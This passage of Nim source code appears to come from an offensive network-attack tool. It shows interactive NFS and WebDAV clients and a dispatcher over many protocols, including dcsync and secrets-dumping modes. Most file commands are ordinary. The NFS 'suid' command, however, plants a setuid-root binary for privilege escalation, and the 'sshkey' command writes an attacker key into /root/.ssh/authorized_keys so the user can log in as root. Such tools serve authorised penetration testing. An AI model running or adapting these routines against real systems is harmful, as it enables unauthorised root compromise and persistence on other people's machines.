    (0o040'u32, "r"), (0o020'u32, "w"), (0o010'u32, "x"),
    (0o004'u32, "r"), (0o002'u32, "w"), (0o001'u32, "x"),
  ]
  for (mask, ch) in bits:
    result.add (if (mode and mask) != 0: ch else: "-")

proc nfsSizeStr(sz: uint64): string =
  if sz < 1024: $sz & " B"
  elif sz < 1024*1024: $(sz div 1024) & " KB"
  elif sz < 1024*1024*1024: $(sz div (1024*1024)) & " MB"
  else: $(sz div (1024*1024*1024)) & " GB"

proc runNfsCli(config: CliConfig) =
  let targets = parseTargets(config.targets)
  if targets.len == 0: raise newException(ValueError, "no targets supplied")
  if targets.len > 1: raise newException(ValueError, "--cli requires exactly one target")
  let host = targets[0]
  let tms = max(config.timeoutMs, 5000)

  let probe = waitFor nfsclient.probeNfs(host, config.port, tms)
  if not probe.reachable:
    raise newException(IOError, "NFS/portmapper not reachable on " & host & ":111")

  var mountPort = probe.mountPort
  var nfsPort = 2049
  for svc in probe.rpcServices:
    if svc.prog == 100003 and svc.proto == 6:
      nfsPort = int(svc.port)

  stderr.writeLine gray("[") & bold("nfs") & gray("] ") & brightCyan(host & ":111")
  if probe.nfsVersions.len > 0:
    let vs = probe.nfsVersions.mapIt("v" & $it).join("  ")
    stderr.writeLine dim("NFS " & vs)
  stderr.writeLine dim("type 'exit' to quit; 'help' for commands; 'exports' to list shares")

  var sess: nfsclient.NfsSession = nil

  proc doMount(exportPath: string) =
    if not sess.isNil:
      nfsclient.nfsCloseSession(sess)
      sess = nil
    try:
      sess = waitFor nfsclient.nfsOpenSession(host, mountPort, nfsPort, tms, exportPath)
      nfsCliOk("mounted " & exportPath)
    except:
      sess = nil
      nfsCliError("mount failed: " & exportPath)

  if probe.exports.len == 1:
    doMount(probe.exports[0].path)

  template mounted(): bool = not sess.isNil

  proc ensureNfsSock() =
    if sess.isNil: return
    if not sess.sock.isNil: return
    try:
      sess.sock = waitFor nfsclient.connectTcpPriv(sess.host, sess.nfsPort, tms)
    except: discard

  proc resolveFh(target: string): string =
    if target == "/": return sess.rootFh
    ensureNfsSock()
    if sess.sock.isNil: return ""
    try:
      let r = waitFor nfsclient.nfsLookupPathSock(sess.sock, tms, sess.rootFh, target)
      if not r.ok: return ""
      return r.fh
    except:
      try: sess.sock.close() except: discard
      sess.sock = nil
      return ""

  initReadline()
  while true:
    var line = ""
    try:
      let prompt = if mounted(): nfsCliPrompt(sess.exportPath, sess.cwd) else: nfsCliPrompt("", "/")
      line = lineread.readlineWithHistory(prompt)
    except EOFError:
      stderr.writeLine ""
      break
    let raw = line.strip()
    if raw.len == 0: continue
    if raw in ["exit", "quit", "bye"]: break
    if raw == "help":
      nfsCliHelp()
      continue
    if raw == "exports":
      if probe.exports.len == 0:
        nfsCliNotice("no exports found")
      else:
        for ex in probe.exports:
          let grps = if ex.groups.len > 0: "  " & dim(ex.groups.join(", ")) else: ""
          stderr.writeLine "  " & brightCyan(ex.path) & grps
      continue
    if raw.startsWith("use "):
      let exportPath = raw[4..^1].strip()
      doMount(exportPath)
      continue
    if not mounted():
      nfsCliError("not mounted - use 'exports' to list exports, then 'use <export>'")
      continue
    if raw == "pwd":
      nfsCliNotice(sess.exportPath & sess.cwd)
      continue
    if raw == "ls" or raw.startsWith("ls "):
      let target = if raw.len > 3: normalizePosixCliPath(sess.cwd, raw[3..^1].strip()) else: sess.cwd
      let fh = resolveFh(target)
      if fh.len == 0: nfsCliError("not found: " & target); continue
      let entries = waitFor nfsclient.nfsReaddirplusSock(sess.sock, tms, fh)
      if entries.len == 0:
        nfsCliNotice("empty")
      else:
        for e in entries:
          let mark = if e.isDir: cyan("d") else: dim("-")
          let sz = dim(nfsSizeStr(e.size).align(8))
          let modeStr = dim(nfsModeStr(e.mode))
          stderr.writeLine mark & "  " & modeStr & "  " & sz & "  " & (if e.isDir: bold(e.name) else: e.name)
      continue
    if raw.startsWith("cd "):
      let arg = raw[3..^1].strip()
      let target = normalizePosixCliPath(sess.cwd, arg)
      if target == "/":
        sess.cwd = "/"
        continue
      let r = waitFor nfsclient.nfsLookupPathSock(sess.sock, tms, sess.rootFh, target)
      if not r.ok: nfsCliError("not found: " & target); continue
      if r.attr.ftype != 2: nfsCliError("not a directory: " & target); continue
      sess.cwd = target
      continue
    if raw.startsWith("stat "):
      let target = normalizePosixCliPath(sess.cwd, raw[5..^1].strip())
      let fh = resolveFh(target)
      if fh.len == 0: nfsCliError("not found: " & target); continue
      let (attr, ok) = waitFor nfsclient.nfsGetattrSock(sess.sock, tms, fh)
      if not ok: nfsCliError("getattr failed"); continue
      let typeStr = case attr.ftype
        of 1: "regular file"
        of 2: "directory"
        of 3: "symbolic link"
        else: "type=" & $attr.ftype
      stderr.writeLine dim("type:  ") & typeStr
      stderr.writeLine dim("mode:  ") & nfsModeStr(attr.mode) & "  (0" & toOct(int(attr.mode), 4) & ")"
      stderr.writeLine dim("uid:   ") & $attr.uid
      stderr.writeLine dim("gid:   ") & $attr.gid
      stderr.writeLine dim("size:  ") & nfsSizeStr(attr.size) & "  (" & $attr.size & " bytes)"
      continue
    if raw.startsWith("cat "):
      let target = normalizePosixCliPath(sess.cwd, raw[4..^1].strip())
      let r = waitFor nfsclient.nfsLookupPathSock(sess.sock, tms, sess.rootFh, target)
      if not r.ok: nfsCliError("not found: " & target); continue
      if r.attr.ftype == 2: nfsCliError("is a directory: " & target); continue
      let data = waitFor nfsclient.nfsReadFileSock(sess.sock, tms, r.fh, r.attr.size)
      stderr.write data
      if data.len > 0 and data[^1] != '\n': stderr.writeLine ""
      continue
    if raw.startsWith("get "):
      let spec = raw[4..^1].strip()
      let parts2 = spec.splitWhitespace()
      let remoteName = normalizePosixCliPath(sess.cwd, parts2[0])
      let localDest = if parts2.len > 1: parts2[1] else: getCurrentDir() / extractFilename(remoteName)
      let r = waitFor nfsclient.nfsLookupPathSock(sess.sock, tms, sess.rootFh, remoteName)
      if not r.ok: nfsCliError("not found: " & remoteName); continue
      if r.attr.ftype == 2: nfsCliError("is a directory: " & remoteName); continue
      let data = waitFor nfsclient.nfsReadFileSock(sess.sock, tms, r.fh, r.attr.size)
      writeFile(localDest, data)
      nfsCliOk(bold(extractFilename(remoteName)) & "  " & dim($data.len & " bytes") & "  " & dim("→ " & localDest))
      continue
    if raw.startsWith("put "):
      let spec = raw[4..^1].strip()
      let parts2 = spec.splitWhitespace()
      let localPath = parts2[0]
      if not fileExists(localPath):
        nfsCliError("local file not found: " & localPath); continue
      let remoteBase = if parts2.len > 1: parts2[1] else: extractFilename(localPath)
      let remoteName = normalizePosixCliPath(sess.cwd, remoteBase)
      let dirPath = remoteName[0 ..< remoteName.rfind('/')]
      let baseName = extractFilename(remoteName)
      let dirFh = resolveFh(if dirPath.len == 0: "/" else: dirPath)
      if dirFh.len == 0: nfsCliError("remote directory not found"); continue
      let data = readFile(localPath)
      let (fh, ok, errCode) = waitFor nfsclient.nfsCreateSock(sess.sock, tms, dirFh, baseName)
      if not ok:
        nfsCliError("CREATE failed" & (if errCode == 13: " (access denied)" elif errCode == 17: " (file exists)" else: " (err=" & $errCode & ")")); continue
      let (written, wok) = waitFor nfsclient.nfsWriteFileSock(sess.sock, tms, fh, data)
      if not wok:
        nfsCliError("WRITE failed after " & $written & " bytes"); continue
      nfsCliOk(bold(baseName) & "  " & dim($written & " bytes") & "  " & dim(localPath & " → " & remoteName))
      continue
    if raw.startsWith("chmod "):
      let args = raw[6..^1].strip().splitWhitespace()
      if args.len < 2: nfsCliError("usage: chmod <octal-mode> <path>"); continue
      var modeVal: uint32
      try: modeVal = uint32(parseOctInt(args[0]))
      except: nfsCliError("invalid mode: " & args[0]); continue
      let target = normalizePosixCliPath(sess.cwd, args[1])
      let fh = resolveFh(target)
      if fh.len == 0: nfsCliError("not found: " & target); continue
      let (ok, errCode) = waitFor nfsclient.nfsSetattrSock(sess.sock, tms, fh, modeVal, true, 0, 0, false, false)
      if ok: nfsCliOk(args[0] & "  " & target)
      else: nfsCliError("SETATTR failed" & (if errCode == 13: " (access denied)" else: " (err=" & $errCode & ")"))
      continue
    if raw.startsWith("suid "):
      let args = raw[5..^1].strip().splitWhitespace()
      if args.len < 1: nfsCliError("usage: suid <local_binary> [remote_name]"); continue
      let localPath = args[0]
      if not fileExists(localPath): nfsCliError("local file not found: " & localPath); continue
      let remoteBase = if args.len > 1: args[1] else: extractFilename(localPath)
      let remoteName = normalizePosixCliPath(sess.cwd, remoteBase)
      let dirPath = remoteName[0 ..< remoteName.rfind('/')]
      let baseName = extractFilename(remoteName)
      let dirFh = resolveFh(if dirPath.len == 0: "/" else: dirPath)
      if dirFh.len == 0: nfsCliError("remote directory not found"); continue
      let data = readFile(localPath)
      let (fh, cok, errCode) = waitFor nfsclient.nfsCreateSock(sess.sock, tms, dirFh, baseName)
      if not cok: nfsCliError("CREATE failed" & (if errCode == 13: " (access denied)" else: " (err=" & $errCode & ")")); continue
      let (written, wok) = waitFor nfsclient.nfsWriteFileSock(sess.sock, tms, fh, data)
      if not wok: nfsCliError("WRITE failed after " & $written & " bytes"); continue
      let (sok, serrCode) = waitFor nfsclient.nfsSetattrSock(sess.sock, tms, fh, 0o4755'u32, true, 0, 0, true, true)
      if not sok: nfsCliError("chmod +s failed" & (if serrCode == 13: " (access denied)" else: " (err=" & $serrCode & ")")); continue
      nfsCliOk(bold(baseName) & "  " & dim($written & " bytes") & "  " & dim("mode 4755 (SUID set)"))
      stderr.writeLine dim("  execute on target: " & remoteName & " -p")
      continue
    if raw.startsWith("sshkey "):
      let args = raw[7..^1].strip().splitWhitespace()
      if args.len < 1: nfsCliError("usage: sshkey <pubkey_file> [remote_authorized_keys]"); continue
      let localKey = args[0]
      if not fileExists(localKey): nfsCliError("local file not found: " & localKey); continue
      let remoteKeyPath = if args.len > 1: args[1] else: "/root/.ssh/authorized_keys"
      let target = normalizePosixCliPath(sess.cwd, remoteKeyPath)
      let dirPath = target[0 ..< target.rfind('/')]
      let baseName = extractFilename(target)
      let dirFh = resolveFh(if dirPath.len == 0: "/" else: dirPath)
      if dirFh.len == 0: nfsCliError("remote directory not found: " & dirPath & " (is the export covering that path?)"); continue
      let keyData = readFile(localKey)
      let (fh, cok, errCode) = waitFor nfsclient.nfsCreateSock(sess.sock, tms, dirFh, baseName)
      if not cok: nfsCliError("CREATE failed" & (if errCode == 13: " (access denied)" else: " (err=" & $errCode & ")")); continue
      let (written, wok) = waitFor nfsclient.nfsWriteFileSock(sess.sock, tms, fh, keyData)
      if not wok: nfsCliError("WRITE failed after " & $written & " bytes"); continue
      discard waitFor nfsclient.nfsSetattrSock(sess.sock, tms, fh, 0o600'u32, true, 0, 0, true, false)
      nfsCliOk("SSH key written to " & target & "  " & dim($written & " bytes"))
      stderr.writeLine dim("  now: ssh root@" & sess.host)
      continue
    nfsCliError("unknown command: " & raw.split(' ')[0])
  if not sess.isNil: nfsclient.nfsCloseSession(sess)

proc runWebDavCli(config: CliConfig) =
  let targets = parseTargets(config.targets)
  if targets.len == 0: raise newException(ValueError, "no targets supplied")
  if targets.len > 1: raise newException(ValueError, "--cli requires exactly one target")
  let host = targets[0]
  var cwd = "/"
  let probe = waitFor webdavclient.probeWebDav(host, config.port, max(config.timeoutMs, 5000), config.useSsl,
    config.username, config.password)
  if not probe.reachable or not probe.davSupported:
    raise newException(IOError, "WebDAV not available")
  if config.username.len > 0 and not probe.authenticated and probe.authMessage.len > 0 and "401" in probe.authMessage:
    raise newException(IOError, "WebDAV authentication failed")
  stderr.writeLine gray("[") & bold("webdav") & gray("] ") &
    brightCyan(host & ":" & $config.port) & "  " &
    dim(if config.username.len > 0: config.username else: "anonymous")
  if probe.server.len > 0:
    stderr.writeLine dim(probe.server)
  stderr.writeLine dim("type 'exit' to quit; 'help' for commands")
  initReadline()
  while true:
    var line = ""
    try:
      line = lineread.readlineWithHistory(webDavCliPrompt(cwd))
    except EOFError:
      stderr.writeLine ""
      break
    let raw = line.strip()
    if raw.len == 0: continue
    if raw in ["exit", "quit", "bye"]: break
    if raw == "help":
      webDavCliHelp()
      continue
    if raw == "whoami":
      webDavCliNotice((if config.username.len > 0: config.username else: "anonymous") & "@" & host)
      continue
    if raw == "pwd":
      webDavCliNotice(cwd)
      continue
    if raw == "ls" or raw.startsWith("ls "):
      let target = if raw.len > 3: normalizePosixCliPath(cwd, raw[3..^1].strip()) else: cwd
      let (ok, entries, msg) = waitFor webdavclient.webDavList(host, config.port, max(config.timeoutMs, 5000),
        config.useSsl, config.username, config.password, target)
      if not ok:
        webDavCliError(msg)
      elif entries.len == 0:
        webDavCliNotice("empty")
      else:
        for e in entries:
          let mark = if e.isDirectory: cyan("d") else: dim("-")
          stderr.writeLine mark & "  " & e.name
      continue
    if raw.startsWith("cd "):
      let target = normalizePosixCliPath(cwd, raw[3..^1].strip())
      let (ok, _, msg) = waitFor webdavclient.webDavList(host, config.port, max(config.timeoutMs, 5000),
        config.useSsl, config.username, config.password, target)
      if ok:
        cwd = target
      else:
        webDavCliError(msg)
      continue
    if raw.startsWith("mkdir "):
      let target = normalizePosixCliPath(cwd, raw[6..^1].strip())
      let (ok, msg) = waitFor webdavclient.webDavMkdir(host, config.port, max(config.timeoutMs, 5000),
        config.useSsl, config.username, config.password, target)
      if ok: webDavCliOk(target) else: webDavCliError(msg)
      continue
    if raw.startsWith("rm "):
      let target = normalizePosixCliPath(cwd, raw[3..^1].strip())
      let (ok, msg) = waitFor webdavclient.webDavDelete(host, config.port, max(config.timeoutMs, 5000),
        config.useSsl, config.username, config.password, target)
      if ok: webDavCliOk("removed " & target) else: webDavCliError(msg)
      continue
    if raw.startsWith("get "):
      let target = normalizePosixCliPath(cwd, raw[4..^1].strip())
      let localDest = getCurrentDir() / extractFilename(target)
      let (ok, nbytes, msg) = waitFor webdavclient.webDavGet(host, config.port, max(config.timeoutMs, 5000),
        config.useSsl, config.username, config.password, target, localDest)
      if ok:
        webDavCliOk(bold(extractFilename(target)) & "  " & dim($nbytes & " bytes") & "  " & dim("→ " & localDest))
      else:
        webDavCliError(msg)
      continue
    if raw.startsWith("put "):
      let localPath = raw[4..^1].strip()
      let remotePath = normalizePosixCliPath(cwd, extractFilename(localPath))
      let (ok, nbytes, msg) = waitFor webdavclient.webDavPut(host, config.port, max(config.timeoutMs, 5000),
        config.useSsl, config.username, config.password, localPath, remotePath)
      if ok:
        webDavCliOk(bold(extractFilename(localPath)) & "  " & dim($nbytes & " bytes"))
      else:
        webDavCliError(msg)
      continue
    webDavCliError("unknown command: " & raw.split(' ')[0])

proc main() =
  randomize()
  try:
    let config = parseCli()
    if config.shellMode and config.cliMode:
      raise newException(ValueError, "--shell and --cli are mutually exclusive")
    if config.disableColor:
      colorEnabled = false
    if config.proxySpec.len > 0:
      configureProxy(config.proxySpec)
    if config.protocol == "krb5conf":
      runKrb5Conf(config)
      return
    if config.cliMode:
      case config.protocol
      of "mssql":
        runMsSqlCli(config)
      of "ftp":
        runFtpCli(config)
      of "mysql":
        runMysqlCli(config)
      of "postgres":
        runPostgresCli(config)
      of "afp":
        runAfpCli(config)
      of "webdav":
        runWebDavCli(config)
      of "nfs":
        runNfsCli(config)
      else:
        raise newException(ValueError, "--cli is only supported for mssql, ftp, mysql, postgres, afp, webdav, nfs")
      return
    if config.shellMode:
      case config.protocol
      of "winrm", "scm", "cim", "bin", "tsch", "mmc", "mssql":
        runShell(config)
      of "ssh":
        for host in config.targets:
          discard waitFor sshclient.sshShell(host, config.port, max(config.timeoutMs, 5000),
            config.username, config.password)
      of "postgres":
        runPostgresShell(config)
      else:
        raise newException(ValueError, "--shell is not supported for " & config.protocol)
      return
    case config.protocol
    of "smb", "ldap", "winrm", "mssql", "rdp", "scm", "cim", "bin",
       "tsch", "mmc", "put", "get", "ls", "rm", "mkdir", "dcsync", "secrets",
       "ssh", "vnc", "ftp", "mysql", "postgres", "afp", "nfs", "webdav", "http", "https",
       "kerberos":
      runProtocol(config)
    of "scan":
      runScan(config)
    of "socks":
      runSocksProxy(config)
    else:
      raise newException(ValueError, "unknown protocol: " & config.protocol)
  except CatchableError as error:
    stderr.writeLine "error: " & error.msg
    quit 1

when isMainModule:
  main()
